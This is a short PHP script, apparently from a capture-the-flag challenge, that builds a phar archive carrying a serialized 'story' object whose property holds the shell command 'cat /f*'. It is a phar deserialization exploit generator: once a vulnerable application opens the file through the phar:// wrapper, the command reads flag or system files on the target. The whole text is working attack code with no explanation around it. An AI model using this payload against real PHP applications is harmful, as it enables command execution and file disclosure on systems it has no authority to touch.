<?php
class story{
   public $eating = 'cat /f*';
   public $God = 'true';
}                 

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new story();
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
?>